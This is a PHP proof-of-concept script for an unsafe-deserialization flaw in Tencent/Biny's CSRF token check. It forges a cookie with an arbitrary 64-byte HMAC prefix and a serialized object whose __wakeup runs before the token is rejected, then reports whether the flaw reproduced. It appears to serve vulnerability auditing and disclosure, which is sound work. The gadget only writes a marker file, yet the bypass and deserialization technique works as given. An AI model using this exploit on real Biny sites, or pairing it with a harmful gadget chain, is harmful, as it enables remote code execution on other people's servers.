<?php
/*
 * Standalone PoC for Tencent/Biny Request::validateCsrfToken() unsafe unserialize.
 * It uses the original Request.php from the target source tree copied into src/Request.php.
 */
namespace biny\lib {
    class Router { public static $ARGS = []; }
    // The target code calls unqualified mb_* functions inside namespace biny\lib.
    // Define compatible namespace-local functions so the PoC is independent of php-mbstring.
    function mb_strlen($s, $enc = null) { return strlen($s); }
    function mb_substr($s, $start, $len = null, $enc = null) { return $len === null ? substr($s, $start) : substr($s, $start, $len); }
}

namespace {
    class App { public static $base; }

    class FakeConfig {
        public function get($name) {
            if ($name !== 'request') {
                return null;
            }
            return [
                'trueToken'    => 'biny-csrf',
                'csrfToken'    => 'csrf-token',
                'csrfPost'     => '_csrf',
                'csrfHeader'   => 'X-CSRF-TOKEN',
                'csrfWhiteIps' => ['127.0.0.1/24'],
                'userIP'       => '',
                'showTpl'      => 'X_SHOW_TEMPLATE',
            ];
        }
    }

    class FakeBase {
        public $config;
        public $router;
        public function __construct() {
            $this->config = new FakeConfig();
            $this->router = (object)['rootPath' => '/'];
        }
    }

    class ProofGadget {
        public function __wakeup() {
            file_put_contents('/tmp/invaudit_biny_wakeup_marker', 'TRIGGERED');
        }
    }

    App::$base = new FakeBase();
    define('RUN_SHELL', false);

    $_SERVER['REQUEST_METHOD'] = 'POST';
    $_SERVER['REMOTE_ADDR'] = '8.8.8.8';
    $_SERVER['CONTENT_TYPE'] = 'application/x-www-form-urlencoded';
    $_SERVER['SERVER_NAME'] = 'localhost';
    $_SERVER['SERVER_PORT'] = '80';

    // Request.php: createCsrfToken() stores: hex_hmac_sha256(64 bytes) . serialize([$trueKey, $trueToken]).
    // validateCsrfToken() strips 64 bytes but never verifies the HMAC before unserialize().
    // Therefore any 64-byte prefix is accepted up to the unsafe deserialization point.
    @unlink('/tmp/invaudit_biny_wakeup_marker');
    $_COOKIE['biny-csrf'] = str_repeat('A', 64) . serialize([0 => 'ignored-key', 1 => new ProofGadget()]);
    $_POST['_csrf'] = 'intentionally-invalid-token';

    require __DIR__ . '/src/Request.php';

    $request = \biny\lib\Request::create('demo');
    $accepted = $request->validateCsrfToken();
    $marker = file_exists('/tmp/invaudit_biny_wakeup_marker') ? file_get_contents('/tmp/invaudit_biny_wakeup_marker') : '';

    echo "validateCsrfToken() returned: " . var_export($accepted, true) . PHP_EOL;
    echo "wakeup marker: " . ($marker ?: '<missing>') . PHP_EOL;

    if ($marker === 'TRIGGERED') {
        echo "[VULNERABLE] Attacker-controlled biny-csrf cookie reached unserialize() and executed ProofGadget::__wakeup() before CSRF rejection." . PHP_EOL;
        exit(0);
    }

    echo "[NOT REPRODUCED] The crafted cookie did not trigger object deserialization." . PHP_EOL;
    exit(1);
}
